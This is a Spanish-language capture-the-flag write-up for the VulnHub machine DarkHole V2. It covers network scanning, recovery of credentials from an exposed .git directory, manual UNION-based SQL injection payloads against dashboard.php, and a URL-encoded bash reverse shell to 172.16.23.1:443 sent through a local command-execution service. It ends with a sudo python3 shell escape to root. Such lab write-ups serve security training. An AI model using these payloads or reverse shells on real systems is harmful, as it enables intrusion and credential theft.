Plataforma: [VulnHub](https://www.vulnhub.com/entry/darkhole-2,740/)
Ataques: 
- Web Application Attack
- SQL inyection.
- Remote SSH.
Dificultad: Media

Herramientas:
- VMWare.

**Plataforma:** [VulnHub](https://www.vulnhub.com/entry/darkhole-2,740/) 
**Objetivo:** _Rootear_ la máquina virtual DarkHole V2.
**Dificultad:** Media 
**Técnicas Clave:** Enumeración GIT, Inyección SQL, Escalada de Privilegios (Abuso de Servicio Local).

---
## Fase I: Reconocimiento y Descubrimiento

El proceso de ataque comenzó con la fase de reconocimiento, indispensable para trazar el mapa de la infraestructura objetivo. 
### Identificación del _Target_ | Arp-Scan

El primer paso fue determinar la dirección IP de la máquina DarkHole V2 en la red local (`vmnet1`).

```
arp-scan -I vmnet1 --localnet
```

- **arp-scan**: Herramienta de reconocimiento de red.
- **-I NOMBRE_DE_RED**: Sirve para especificar el adaptador de red que queremos escanear. 
- --localnet: Indicamos que el escaneo se debe realizar por medio de toda la red.
  
![[Pasted image 20251009015848.png]]
arp-scan me enseña que por medio de la red del adaptador "vmnet1" hay otras dos máquinas conectadas. En este caso siendo nuestra máquina objetivo "**172.16.23.128**".

### Escaneo de Puerto y Servicios | nmap

Ya sabiendo la IP, se procedió a un escaneo exhaustivo para identificar los servicios en ejecución y obtener información de versiones. 
```
nmap -p- -sVC --open -T4 -vvv -n -Pn
```
- ```-p- --open ```: Verificamos  los 65535 puertos, que nos reporte los puertos abiertos.
- ```-sVC```: Verificamos servicios y ejecutamos los scripts básicos de reconocimiento.
- ```-T4```: Plantilla de tiempo 4. Velocidad de escaneo agresiva. 
- ```-vvv```: Imprime la información en tiempo real
- ```-n```: Deshabilita la resolución DNS (Mejoramos la velocidad de escaneo)
- ```-Pn```: Omitimos el _host discovery_, forzando el reconocimiento de todos los puertos.
  
![[Pasted image 20251007202303 1.png]]

El escaneo de `Nmap` reveló dos puertos clave:

1. **Puerto 80 (HTTP):** Operando **Apache httpd 2.4.41** sobre una arquitectura **Ubuntu Linux** (`ttl 64`). Esto confirmaba la presencia de una aplicación web, denominada **"DarkHole V2"**.    
2. **Puerto 22 (SSH):** Exponiendo el servicio **OpenSSH 8.2p1**, lo que indicaba una potencial vía de acceso remoto con credenciales válidas.
### Puerto 80 abierto.
```
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
```

Ingresamos a la IP de la máquina (http://172.16.23.128/) y vemos la aplicación web. También veo un ttl de 64 y la versión Apache httpd 2.4.41 Ubuntu, por lo que está claro que estamos ante una máquina Linux.
![[Pasted image 20251010011228.png]]

### Puerto 22 abierto.
```
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

Esto nos indica que la máquina usa dicho puerto para establecer conexión SSH. Además, veo también que el parámetro -sC nos brinda información adicional:

### Proyecto WEB con .git.
```
|_http-title: DarkHole V2
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   172.16.23.128:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
```

Esto revela un subdominio /.git/ en la web junto con el comentario "i changed login.php file for more secure" por parte del creador. Esto me da a entender que pueden haber más versiones del proyecto almacenados en la herramienta GIT, por lo que ingreso al subdominio "http://172.16.23.128/.git/" y veo varios archivos:
![[Pasted image 20251007202749 1.png]]

Esto me lleva a la decisión de descargar el contenido del proyecto con intensión de ver los LOGS almacenados en la herramienta git. En mi carpeta de assets procedo a correr el siguiente comando:
```
wget -r http://172.16.23.128/.git/
```
![[Pasted image 20251010012855.png]]

Ya con la carpeta descargada lo primero que hago en revisar los logs de git con el comando:
```
git log
```
![[Pasted image 20251010013040.png]]
esto me da bastante información ya que veo que hay 3 commits del proyecto:

- 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4: el HEAD, el estado donde se encuentra el proyecto. 
- a4d900a8d85e8938d3601f3cef113ee293028e10: Otro estado con el comentario "I added login.php file with default credentials"
- aa2a5f3aa15bb402f2b90a07d86af57436d64917: Un estado con "First Initialize" como comentario, la base del proyecto por lo que se entiende.

### Reconocimiento de sub-dominios.
El 2do commit nos indica que se ha agregado un archivo "login.php", presuntamente un sobdominio de inicio de sesión de la página web, por lo que procedo a ejecutar un script básico de nmap sobre la IP de la máquina para verificar subdominios:

```
nmap --script http-enum 172.16.23.128
```
![[Pasted image 20251010015142.png]]
```
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /.git/HEAD: Git folder
|   /config/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /style/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

Esta sección me confirma que "login.php" es un subdominio de la pagina web, justo a  /.git,  /config,  /js y /style.
![[Pasted image 20251010015622 1.png]]

### Leak de credenciales.
Esto me hace ejecutar el comando para ver más información del commit:
```
git show a4d900a8d85e8938d3601f3cef113ee293028e10
```
![[Pasted image 20251007203715 1.png]]

Se observa como al inicio de los cambios agregados está la siguiente sección:
```
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
+        header("location:dashboard.php");
+        die();
```

Esto es un claro leak de información ya que vemos las credenciales:
- email: lush@admin.com.
- password: 321.
## Recuento de información | FASE 01.

Hasta el momento he recolectado la siguiente información relevante: 
- Maquina: Linux | SO: Ubuntu.
- Puerto 22 Abierto: Servicio SSH.
- Puerto 80 abierto: Host - Apache httpd 2.4.41.
	- Página Web: DarkHole V2
	- Subdominios: /.git, /config, /js, /style.
	- Proyecto con git (Leak de crendenciales).
		- commit: a4d900a8d85e8938d3601f3cef113ee293028e10
- Credenciales: 
	- lush@admin.com:321
--- 
# Inicio de Ataque | Pentest.

Con esta información en mente procedo a ingresar a http://172.16.23.128/login.php para probar las credenciales que encontramos, dando como resultado un dashboard de inicio de sesión exitoso:
![[Pasted image 20251007204132 1.png]]


La página a simple vista se ve como un login normal, por lo que procedo a investigar la pagina y me doy cuenta que la URL del dashboard es: http://172.16.23.128/dashboard.php?id=1. El "id=1" me da a entender que el dashboard puede no estar sanado por lo que procedo a abrir la herramienta Burp Suite:
![[Pasted image 20251010201917.png]]


Veo que la página web envía una solicitud ```GET``` terminado de un ```?id=1``` por lo que activo el modo repeater de Burp Suite para empezar a probar un **ataque de inserción de SQL**.

### Modificando solicitud - Burp Suite | Ataque: SQLi Manual

1. Modifico a: "```GET /dashboard.php?id=2 HTTP/1.1```". 200 OK. Acceso al dashboard de otro usuario.Me doy cuenta de que los campos "value" pasan a estar vacíos en este usuario por lo que procedo a verificar el ingreso de datos.	![[Pasted image 20251010210016.png]]

2. Modifico a: ```GET /dashboard.php?id=2'+order+by+NUMERO--+- HTTP/1.1```. Hago un recuento de las tablas existentes cambiando "NUMERO" consecutivamente hasta que me dé un error 500. De esta forma logro identificar que hay 6 tablas activas.
   
3. Modifico a: ```GET /dashboard.php?id=2'+union+select+1,2,3,4,5,6--+-``` para identificar cada uno de los campos donde vamos a poder empezar a extraer información. Logro identificar los valores donde puedo empezar a trabajar, en este caso 2, 3, 5 y 6:  ![[Pasted image 20251010213113.png]]

4. Modifico a: ```GET /dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+-```. Para listar todas las tablas dentro del campo que anteriormente era "3". Obteniendo una respuesta por parte del servidor e identificando las tablas "mysql,information_schema,performance_schema,sys,darkhole_2" dentro de la base de datos. Siento "darkhole_2" la más sobresaliente de todas:	![[Pasted image 20251010214851.png]]


5. Modifico a: ```GET /dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+-```. Logro identificar que dentro de la tabla "darkhole_2" se encuentran las tablas "ssh,users".	![[Pasted image 20251010220216.png]]
   
6. Modifico a: ```GET /dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema%3d'darkhole_2'+and+table_name%3d'ssh'--+-```. Logro identificar las columnas "id,user,pass" dentro de "ssh".   ![[Pasted image 20251011142414.png]]
   
7. Modifico a: ```GET /dashboard.php?id=2'+union+select+1,2,group_concat(id,0x3a,user,0x3a,pass),4,5,6+from+darkhole_2.ssh--+- HTTP/1.1```. Con esta solicitud puedo verificar el contenido de las columnas de "ssh", encontrando la información: 1:jehad:fool. ![[Pasted image 20251011153737.png]]
   

---
### Verificación opcional - SQLmap| Ataque: SQLi Automático



Con esta información, intuyo que la tabla "ssh" está asociada a la conexión SSH que permite el puerto 22 anteriormente indentificado, para asegurar la información antes de establecer conexión SSH verifico la demás información de la base apoyandome de SQLmap:

## Recuento de información | FASE 2.

Hasta el momento he recolectado la siguiente información relevante: 
- Maquina: Linux | SO: Ubuntu.
- Puerto 22 Abierto: Servicio SSH.
- Puerto 80 abierto: Host - Apache httpd 2.4.41.
	- Página Web: DarkHole V2
	- Subdominios: /.git, /config, /js, /style, /dashboard.
	- Proyecto con git (Leak de crendenciales).
		- commit: a4d900a8d85e8938d3601f3cef113ee293028e10
	- Proyecto con vulnerabilidad en subdominio "/dashboard"
		- Vulnerable a: SQLi		

- Credenciales: 
	- http://172.16.23.128/: lush@admin.com:321
	- ssh: jehad:fool

---

## Escalada de privilegios | Conexión SSH y Reverse Shell

Con toda esta información, lo primero que intento es establecer una conexión SSH con la maquina http://172.16.23.128/ con las credenciales obtenidas de la base de datos "darkhole_2", dando una conexión exitosa. 

Para ello, utilizo el siguiente comando: 
```
ssh jehad@172.16.23.128
```

![[Pasted image 20251011164420.png]]

### FASE 01 - Reconocimiento básico

Una vez dentro de la terminal empiezo a recolectar más información relevante de la misma. para ello, utilizo la siguiente lista de comandos: 

```
uname -a
```
	Verifico el SO y la versión del Kernel: Linux darkhole 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

```
cat /etc/os-release
```
	Verifico la versión exacta del SO: VERSION="20.04.3 LTS (Focal Fossa)"

```
sudo -l
```
	Verifico que jehad no tiene acceso a sudo.

```
id
```
	jehad no pertecen a ningún otro grupo sensible

```
cat /etc/passwd
```
	Verifico los otros usuarios que hay en la maquina con acceso a bash. Obtengo los usuarios: root (Superusuario, UID 0), lama (Usuario estándar, UID 1000), jehad (Usuario estándar, UID 1001), losy (Usuario estándar, UID 1002)

```
cat /etc/shadown
```
	Verifico contraseñas HASH de los usuarios. jehan no tiene acceso.

```
history
```
	Veo el historial de comandos que ha realizado jehad dentro de la máquina darkhole. Comandos que resaltan:
		- cd /home/losy.
		- cd /opt/web.
		- curl "http://localhost:9999/?cmd=id".
		- ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129.

![[Pasted image 20251011180842.png]]

```
netstat -tulpn
```
![[Pasted image 20251011195101.png]]
	Confirmo que hay un servicio en estado LISTEN bajo el puerto 9999.

```
htop
```
![[Pasted image 20251011195418.png]]
	Confirmo que es el servicio está corriendo bajo el usuario "losy", un servidor php ubicado en /opt/web

```
cd /opt/web
cat index.php
```
![[Pasted image 20251011195645.png]]
	Identifico un script simple para acceder a comandos de la terminal de forma remota.


### FASE 02 - Pensamiento lateral.

Con toda esta información, primero reviso el contenido de carpeta /home/ confirmando las carpetas de los usuarios de jehad, lama y losy. También encuentro el archivo "user.txt" con una flag.

![[Untitled.png]]

Luego, intento es usar el comando  ```curl "http://localhost:9999/?cmd=id"``` en el terminal de la victima. Esto me da como respuesta una ejecución de comandos como parte del usuario "losy": 
![[Pasted image 20251011181920.png]]

Esto me da a entender que puedo tener acceso al usuario losy con el comando ```bash -c "bash -i >& /dev/tcp/172.16.23.1/443 0>&1"``` por lo que proceso a ponerme en escucha desde mi terminal con ayuda de netcat y el puerto 443: 
```
nc -lvnp 443
```
![[Pasted image 20251011223003.png]]

Desde la consola de jehad, proceso a enviar el comando en formato URL encode por medio de la herramienta "curl". 
```
curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
```
![[Pasted image 20251011223225.png]]

Esto me da acceso desde mi terminal al usuario "losy", por lo que procedo a acomodar la terminal para trabajar más cómodamente:


```
/usr/bin/script -qc /bin/bash /dev/null
```
(Luego CRTL+Z)
```
stty raw -echo; fg
```
```
export TERM=xterm
```

ya con la terminal configurada procedo a ver el historial de losy:

```
history
```
![[Pasted image 20251011230950.png]]


El historial muestra información **CRITICA**. El usuario ha usado:
1. ```sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")```
2. ```sudo python3 -c 'import os; os.system("/bin/sh")'```
3. ```P0assw0rd losy:gang```

Esto me da a entender que losy puede y ha estado ejecutando python como root para adquirir una shell como administrador. Además, en lo que parece ser un intento de inicio de sesión, se exponen sus credenciales.


## Acceso al terminal root.

![[Untitled 1.png]]

Utilizo el comando  ```sudo python3 -c 'import os; os.system("/bin/sh")'``` y las credenciales ```losy:gang``` para acceder a la terminal. Utilizo  ```cd /root``` para localizar la última flag.